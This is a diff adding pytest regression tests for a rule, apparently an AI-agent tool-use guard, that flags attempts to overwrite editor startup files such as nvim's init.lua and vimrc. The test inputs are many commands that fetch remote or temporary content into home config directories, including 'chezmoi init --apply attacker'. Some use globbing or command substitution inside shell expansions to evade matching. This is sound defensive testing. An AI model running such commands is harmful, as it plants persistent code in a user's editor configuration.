@@ -900,3 +900,86 @@ def test_r6_cd_star_blowup_bounded():
     t = time.time()
     d = rules.rule_editor_startup_protect(_shell(cmd), EMPTY)
     assert time.time() - t < 2.0 and _ours(d)
+
+
+# ---- QA round 7 regressions ---------------------------------------------------
+
+@pytest.mark.parametrize("cmd", [
+    "cd ~ && git init && git remote add o https://x/dots && git pull o main",
+    "git --work-tree=$HOME --git-dir=$HOME/.dots checkout -f",
+    "git --work-tree ~ --git-dir ~/.dots checkout",
+    "git -C ~ pull", "git -C ~/.config pull", "cd ~/.config && git pull https://x/dots main",
+    "cd ~ && git checkout o/main -- .", "cd ~ && git merge o/main",
+    "cd ~ && git restore --source=o/main .", "cd ~ && git switch -f main",
+    "cd ~ && git stash pop", "cd ~ && git apply /tmp/x.patch", "cd ~ && git am /tmp/x.mbox",
+    "GIT_WORK_TREE=$HOME git --git-dir=$HOME/.dots checkout",
+    "chezmoi init --apply attacker", "chezmoi apply", "yadm clone https://x/dots",
+    "yadm checkout -f",
+    "cd ~/.c?nfig && echo x > nvim/init.lua", "cd ~/.conf* && cp /tmp/x nvim/init.lua",
+    "cd ~/.[c]onfig && cp /tmp/x nvim/init.lua", "cd ~/.conf* && git clone https://x/y nvim",
+    "cd ~/.conf* && mv /tmp/nvim .", "cd /e?c && echo x >> vimrc",
+    "cp -aT /tmp/dots ~", "cp -rT /tmp/cfg ~/.config", "cp --no-target-directory -r /tmp/dots ~",
+    "ditto /tmp/dots ~", "xcopy /E /I C:\\tmp\\dots %USERPROFILE%",
+    "cd ~/.config && wget -nH -r https://x/nvim/", "cd ~ && wget -r -nH https://x/",
+    "scp -r host:nvim ~/.config/", "cd ~/.config && scp -r host:nvim .", "scp -r host:dots/* ~/",
+    "svn export https://x/dots ~ --force", "npx degit user/dots ~ --force",
+    "rclone copy remote:dots ~", "aws s3 sync s3://b/dots ~",
+    "docker cp c:/root/. ~", "kubectl cp ns/pod:/root/. ~",
+    "unsquashfs -f -d ~ x", "cabextract -d ~ x",
+    "python3 -m zipfile -e x.zip ~", "python3 -m tarfile -e x.tgz ~",
+    ": ${x:=$(tar xzf /tmp/x.tgz -C ~)}", "echo $(( $(tar xzf /tmp/x.tgz -C ~) ))",
+    "echo x >> ~/.vimrc.local",
+])
+def test_r7_shell_gated(cmd):
+    assert _ours(evaluate(_shell(cmd), EMPTY)), cmd
+
+
+def test_r7_git_pull_in_home_cwd_gated():
+    assert _ours(evaluate(_sh_cwd("git pull https://x/dots main", "/home/u"), EMPTY))
+    assert _ours(evaluate(_sh_cwd("git pull https://x/dots main", "/home/u/.config"), EMPTY))
+
+
+@pytest.mark.parametrize("tool", [
+    "mcp__text-editor__search_replace", "mcp__text_editor__search_replace",
+    "mcp__code__search_and_replace", "mcp__ide__search_replace_block",
+    "mcp__editor__apply_search_replace", "mcp__codesearch__search_and_edit",
+])
+def test_r7_search_named_editors_gated(tool):
+    ev = _mcp({"file_path": "/home/u/.config/nvim/init.lua", "search": "a", "replace": "b"},
+              tool=tool)
+    assert _ours(evaluate(ev, EMPTY)), tool
+
+
+@pytest.mark.parametrize("tool", [
+    "mcp__runner__run_command_with_logs", "mcp__task__run_and_log",
+    "mcp__process__start_process_log",
+])
+def test_r7_log_named_runners_gated(tool):
+    ev = _mcp({"command": "cp /tmp/x ~/.config/nvim/init.lua"}, tool=tool)
+    assert _ours(evaluate(ev, EMPTY)), tool
+
+
+def test_r7_mcp_cwd_exact_key_preferred():
+    ev = _mcp({"logdir": "/tmp", "cwd": "/home/u/.config", "command": "cp /tmp/x nvim/init.lua"},
+              tool="mcp__shell__run_command")
+    assert _ours(evaluate(ev, EMPTY))
+
+
+def test_r7_mcp_relative_path_with_cwd():
+    ev = Event.make(HookEvent.PRE_TOOL_USE, tool="mcp__serena__create_text_file",
+                    action=ActionClass.MCP, cwd="/home/u/.config/nvim",
+                    args={"relative_path": "init.lua", "content": "x"})
+    assert _ours(evaluate(ev, EMPTY))
+
+
+@pytest.mark.parametrize("ev", [
+    _mcp({"url": "https://github.com/x/.vimrc"}, tool="mcp__fetch__fetch"),
+    _mcp({"thought": "run cp -r ~/dot/nvim ~/.config/nvim later"},
+         tool="mcp__sequential-thinking__think"),
+    _shell("cd /repo && git pull"), _shell("cd /repo && git checkout -b feat"),
+    _shell("git stash list"), _shell("git reset HEAD~1"),
+    _shell("aws s3 sync ./build s3://bucket/site"), _shell("docker cp ./app c:/app"),
+    _shell("wget https://x/y.tgz"), _shell("rclone copy ./out remote:bk"),
+])
+def test_r7_false_positives_fixed(ev):
+    assert evaluate(ev, EMPTY).rule != RULE
